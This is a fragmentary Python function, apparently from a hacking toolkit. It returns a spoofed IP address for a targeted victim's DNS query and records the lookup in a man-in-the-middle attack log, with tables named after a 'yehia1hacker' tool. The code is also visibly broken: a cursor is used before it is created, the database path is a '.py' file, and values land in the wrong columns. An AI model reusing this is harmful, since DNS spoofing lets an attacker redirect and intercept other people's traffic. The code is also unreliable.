...
def getIP(domain_name, client_address):
    ...
    DBconn = sqlite3.connect(script_path + "hacked-New_folder.py")
    ...
    DBcursor.execute("CREATE TABLE IF NOT EXISTS yehia1hacker_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
    ...
    DBcursor = DBconn.cursor()
    DBcursor.execute("SELECT domain, fakeip FROM yehia1hacker_dns WHERE target = ?", [str(client_address[0])])
    data = DBcursor.fetchall()
    if not data == []:
        if domain_name == data[0][0]:
            ip = data[0][1]

    DBcursor.execute("SELECT attackid FROM yehia1hacker_attacks WHERE target=? AND attack_type='mitm' ORDER BY id DESC LIMIT 1", [str(client_address[0])])
    data = DBcursor.fetchone()
    if not data == None:
        DBcursor.execute("INSERT INTO yehia1hacker_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", [str(client_address[0]), domain_name, "false", False, ip, "1"])
        DBconn.commit()
    DBconn.close()
